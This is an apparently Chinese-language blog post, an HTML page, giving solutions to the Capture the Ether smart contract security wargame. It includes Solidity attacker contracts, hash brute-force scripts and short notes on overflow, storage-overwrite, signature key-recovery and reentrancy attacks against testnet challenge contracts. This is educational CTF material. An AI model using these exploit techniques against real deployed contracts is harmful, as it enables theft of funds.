@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zpano.cn","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false}};
+  </script>
+
+  <meta name="description" content="闲来无事，随便刷一刷">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Capture the Ether wp">
+<meta property="og:url" content="https://zpano.cn/2022/03/10/34/index.html">
+<meta property="og:site_name" content="Zpano&#39;s Blog">
+<meta property="og:description" content="闲来无事，随便刷一刷">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zpano.cn/2022/03/10/34/image-20211118161455127.png">
+<meta property="article:published_time" content="2022-03-10T13:10:58.000Z">
+<meta property="article:modified_time" content="2022-03-10T13:12:52.523Z">
+<meta property="article:author" content="Zpano">
+<meta property="article:tag" content="区块链安全">
+<meta property="article:tag" content="智能合约安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zpano.cn/2022/03/10/34/image-20211118161455127.png">
+
+
+<link rel="canonical" href="https://zpano.cn/2022/03/10/34/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Capture the Ether wp | Zpano's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Zpano's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">不负韶华，不负野心</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Capture-the-Ether-wp"><span class="nav-number">1.</span> <span class="nav-text">Capture the Ether wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Guess-the-secret-number"><span class="nav-number">1.1.</span> <span class="nav-text">Guess the secret number</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Guess-the-random-number"><span class="nav-number">1.2.</span> <span class="nav-text">Guess the random number</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Guess-the-new-number"><span class="nav-number">1.3.</span> <span class="nav-text">Guess the new number</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Predict-the-future"><span class="nav-number">1.4.</span> <span class="nav-text">Predict the future</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Predict-the-block-hash"><span class="nav-number">1.5.</span> <span class="nav-text">Predict the block hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Token-sale"><span class="nav-number">1.6.</span> <span class="nav-text">Token sale</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Token-whale"><span class="nav-number">1.7.</span> <span class="nav-text">Token whale</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Retirement-fund"><span class="nav-number">1.8.</span> <span class="nav-text">Retirement fund</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mapping"><span class="nav-number">1.9.</span> <span class="nav-text">Mapping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Donation"><span class="nav-number">1.10.</span> <span class="nav-text">Donation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fifty-years"><span class="nav-number">1.11.</span> <span class="nav-text">Fifty years</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fuzzy-identity"><span class="nav-number">1.12.</span> <span class="nav-text">Fuzzy identity</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Public-Key"><span class="nav-number">1.13.</span> <span class="nav-text">Public Key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Account-Takeover"><span class="nav-number">1.14.</span> <span class="nav-text">Account Takeover</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Assume-ownership"><span class="nav-number">1.15.</span> <span class="nav-text">Assume ownership</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Token-bank"><span class="nav-number">2.</span> <span class="nav-text">Token bank</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Zpano"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Zpano</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zpano.cn/2022/03/10/34/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Zpano">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zpano's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Capture the Ether wp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-03-10 21:10:58 / 修改时间：21:12:52" itemprop="dateCreated datePublished" datetime="2022-03-10T21:10:58+08:00">2022-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">区块链安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>7.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">闲来无事，随便刷一刷</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Capture-the-Ether-wp"><a href="#Capture-the-Ether-wp" class="headerlink" title="Capture the Ether wp"></a>Capture the Ether wp</h1><h2 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> sha3.keccak_256(long_to_bytes(i)).digest().<span class="built_in">hex</span>()==<span class="string">&#x27;db81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365&#x27;</span>:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+<h2 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h2><p><img src="/2022/03/10/34/image-20211118161455127.png" alt="image-20211118161455127"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> web3.auto.infura.ropsten <span class="keyword">import</span> w3</span><br><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i)</span><br><span class="line">blcokhash=<span class="built_in">int</span>(w3.eth.getBlock(<span class="number">11448140</span>-<span class="number">1</span>)[<span class="string">&#x27;hash&#x27;</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">blcoktimetamp=w3.eth.getBlock(<span class="number">11448140</span>)[<span class="string">&#x27;timestamp&#x27;</span>]</span><br><span class="line"></span><br><span class="line">print(sha3.keccak_256(byte32(blcokhash)+byte32(blcoktimetamp)).digest().<span class="built_in">hex</span>()[-<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>
+<h2 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract attacker &#123;</span><br><span class="line">    function attacker() public payable &#123;</span><br><span class="line">        uint8 result &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">        GuessTheNewNumberChallenge target &#x3D; GuessTheNewNumberChallenge(0x955745113aB0E98ACdfe1ffC6846C4d1CdfC4cFd);</span><br><span class="line">        target.guess.value(1 ether)(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    PredictTheFutureChallenge claim &#x3D;PredictTheFutureChallenge(0x69cF0a12620Fc8530bD94ab80b08C6b4A58d322d);</span><br><span class="line">    function attack() payable public&#123;</span><br><span class="line">        claim.lockInGuess.value(1 ether)(1);</span><br><span class="line">    &#125;</span><br><span class="line">    function tryhack()&#123;</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        if(answer&#x3D;&#x3D;1) &#123;</span><br><span class="line">            claim.settle();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    PredictTheBlockHashChallenge claim &#x3D; PredictTheBlockHashChallenge(0x75A30ccC225cCe71F553d113612F04F42Ec11221);</span><br><span class="line">    uint settlementBlockNumber;</span><br><span class="line">    function attack() payable public&#123;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">        claim.lockInGuess.value(1 ether)(0x0000000000000000000000000000000000000000000000000000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line">    function tryhack()&#123;</span><br><span class="line">        require(settlementBlockNumber-block.number&gt;&#x3D;256);</span><br><span class="line"> </span><br><span class="line">        claim.settle();</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h2><p>整数乘法上溢</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="built_in">hex</span>(<span class="number">2</span>**<span class="number">256</span>//<span class="number">10</span>**<span class="number">18</span> +<span class="number">1</span>))</span><br><span class="line">tt=<span class="number">2</span>**<span class="number">256</span>//<span class="number">10</span>**<span class="number">18</span> +<span class="number">1</span></span><br><span class="line">print(tt*<span class="number">10</span>**<span class="number">18</span>-<span class="number">2</span>**<span class="number">256</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h2><p>_transfer函数存在溢出</p>
+<p>player  transfer  -&gt; A 600</p>
+<p>A   approve -&gt; player 1000</p>
+<p>player   transferFrom -&gt; A -&gt; B 600</p>
+<p>Balance[player]-600</p>
+<h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><p>自毁强制转账，满足调用collectPenalty</p>
+<h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><p>覆盖map数组的长度实现数组越界访问，最后通过计算相对位置覆盖isComplete</p>
+<h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><p>结构体的非显式存储导致(未初始化的storage指针)的变量覆盖</p>
+<p>donation.etherAmount=uint256(address) 可以实现对owner的覆盖</p>
+<p>再简单计算一下msg.value</p>
+<h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><p>算是Mapping和Donation的结合体</p>
+<p>msg.value会覆盖queue的长度，timestamp会覆盖head</p>
+<p>Upset(1,2^256-86400)(1 wei)</p>
+<p>Upset(1,0)(1 wei)</p>
+<p>需要注意的是，我们的msg.value会先覆盖contribution.amount，而后的push操作会用queue长度再覆盖contribution.amount一次，也就是实际记录的total会大于contract.balance，会导致我们在withdraw的时候失败，所以需要进行一定的变形，这就是两次1wei的原因所在</p>
+<h2 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract BadCodeSmarx is IName &#123;</span><br><span class="line">    function callAuthenticate(address _challenge) public &#123;</span><br><span class="line">       FuzzyIdentityChallenge(_challenge).authenticate(); </span><br><span class="line">    &#125;</span><br><span class="line">    function name() external view returns (bytes32) &#123;</span><br><span class="line">       return bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from web3 import Web3</span><br><span class="line"></span><br><span class="line">s1 &#x3D; &#39;0xff&#39;+address(EOA)</span><br><span class="line"></span><br><span class="line">s3 &#x3D; &#39;4670da3f633e838c2746ca61c370ba3dbd257b86b28b78449f4185480e2aba51&#39;</span><br><span class="line"></span><br><span class="line">i &#x3D; 0</span><br><span class="line">while(1):</span><br><span class="line">    salt &#x3D; hex(i)[2:].rjust(64, &#39;0&#39;)</span><br><span class="line">    s &#x3D; s1+salt+s3</span><br><span class="line">    hashed &#x3D; Web3.sha3(hexstr&#x3D;s)</span><br><span class="line">    hashed_str &#x3D; &#39;&#39;.join([&#39;%02x&#39; % b for b in hashed])</span><br><span class="line">    if &#39;badc0de&#39; in hashed_str[24:]:</span><br><span class="line">        print(salt,hashed_str)</span><br><span class="line">        break</span><br><span class="line">    i +&#x3D; 1</span><br><span class="line">    print(salt)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Deployer &#123;</span><br><span class="line">    &#x2F;&#x2F; contractBytecode是待部署合约的bytecode</span><br><span class="line">    bytes contractBytecode &#x3D; hex&quot;608060405234801561001057600080fd5b5061015d806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806306fdde031461003b5780637872ab4914610059575b600080fd5b61004361009d565b6040518082815260200191505060405180910390f35b61009b6004803603602081101561006f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100c5565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010d57600080fd5b505af1158015610121573d6000803e3d6000fd5b505050505056fea265627a7a72315820fb2fc7a07f0eebf799c680bb1526641d2d905c19393adf340a04e48c9b527de964736f6c634300050c0032&quot;;</span><br><span class="line"> </span><br><span class="line">    function deploy(bytes32 salt) public &#123;</span><br><span class="line">        bytes memory bytecode &#x3D; contractBytecode;</span><br><span class="line">        address addr;</span><br><span class="line">      </span><br><span class="line">        assembly &#123;</span><br><span class="line">          addr :&#x3D; create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Public-Key"><a href="#Public-Key" class="headerlink" title="Public Key"></a>Public Key</h2><p>公钥计算</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&#x27;ethers&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> provider = <span class="keyword">new</span> ethers.providers.InfuraProvider(<span class="string">&#x27;ropsten&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(provider._isProvider)</span><br><span class="line"><span class="keyword">let</span> transactionHash=<span class="string">&quot;0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb&quot;</span></span><br><span class="line">provider.getTransaction(transactionHash).then(<span class="function">(<span class="params">firstTx</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(firstTx);</span><br><span class="line">    <span class="keyword">const</span> txData = &#123;</span><br><span class="line">        gasPrice: firstTx.gasPrice,</span><br><span class="line">        gasLimit: firstTx.gasLimit,</span><br><span class="line">        value: firstTx.value,</span><br><span class="line">        nonce: firstTx.nonce,</span><br><span class="line">        data: firstTx.data,</span><br><span class="line">        to: firstTx.to,</span><br><span class="line">        chainId: firstTx.chainId,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> signingData = ethers.utils.serializeTransaction(txData);</span><br><span class="line">    <span class="keyword">const</span> msgHash = ethers.utils.keccak256(signingData);</span><br><span class="line">    <span class="keyword">const</span> signature = &#123; <span class="attr">r</span>: firstTx.r, <span class="attr">s</span>: firstTx.s, <span class="attr">v</span>: firstTx.v &#125;;</span><br><span class="line">    <span class="keyword">let</span> rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);</span><br><span class="line">    rawPublicKey = <span class="string">`0x<span class="subst">$&#123;rawPublicKey.slice(<span class="number">4</span>)&#125;</span>`</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Recovered public key <span class="subst">$&#123;rawPublicKey&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h2 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h2><p>利用随机数冲突的ECDSA签名恢复以太坊私钥</p>
+<p><a target="_blank" rel="noopener" href="http://snowming.me/2022/01/05/recover_secert_key/">参考</a></p>
+<h2 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h2><p>权限控制问题</p>
+<h1 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h1><p>重入攻击</p>
